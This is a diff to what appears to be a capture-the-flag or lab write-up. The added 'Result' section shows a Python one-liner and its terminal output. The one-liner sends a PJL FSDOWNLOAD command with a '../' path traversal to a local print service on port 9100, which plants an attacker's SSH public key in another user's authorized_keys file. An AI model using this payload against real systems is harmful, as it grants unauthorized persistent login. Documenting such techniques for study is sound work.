@@ -775,8 +775,6 @@ Keypair created: `archivist_key` (private) and `archivist_key.pub` (public). The
 
 **Command:**
 
-python
-
 ```python
 python3 -c "
 import socket
@@ -801,6 +799,32 @@ print('[+] Key written')
     - **Purpose:** Install our public key as a trusted login credential for `archivist`, converting file-write into interactive access.
 
 **Result:**
+
+```shell
+lp@paperwork:/opt/LPDServer$ python3 -c "
+import socket
+key = b'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6Sl+sL5XXpDOykwIDqU/m8iadBIKwZfbqI/KdSxb9A9aMQzXXBtw0J7cApXJju7ypzoHx4FL4NzMVn2jB7Mrm/ZV6SMkzFUiLK9oP2xF9jG/TO28HdhLkbkB8Zs5toKBttTnPG4dkUqufU2ekhG77gCJ0Nbf8LwOBqAMFClEbl4/4hj5yLZp3C/I/TVf7Cl3o/QCpgBRPDbj9hkhADZlxGQpn6by5lFL/EA6JD+fc4CAJl7rfUusFUPKsmTslfueTO6lSLXy4DFHE2f9hfE2ixw3MEc3uk0Hz22Ti4QI5qCurFxJIAyT5jBRneqmr4tHAMZS6dbTE4aLSj0cHrYrgVX9vdGKdUjVjHIAwaH4Lm6BdE6/bY+HiDlQ+cP1pQVFxXKFcxYFRDA4kI0Lg5UcYo2WtjEL7s12phCvbgCxPDbiXuOvXIc1z354u9IXFQAR+8JnqKu9arLB4AgltJ3Cp1yxJwBwjaomtdukTbpXgEakgQuRaNwGTYksXWczRhf0= kali@kali\n'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 9100))
+header = b'@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=%d\n' % len(key)
+s.send(header)
+s.send(key)
+s.close()
+print('[+] Key written')
+"python3 -c "
+> import socket
+<wjaomtdukTbpXgEakgQuRaNwGTYksXWczRhf0= kali@kali\n'
+> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+> s.connect(('127.0.0.1', 9100))
+<hivist/.ssh/authorized_keys\" SIZE=%d\n' % len(key)
+> s.send(header)
+> s.send(key)
+> s.close()
+> print('[+] Key written')
+> 
+"
+[+] Key written
+```
 <div align="center">
 <br>
 <br>
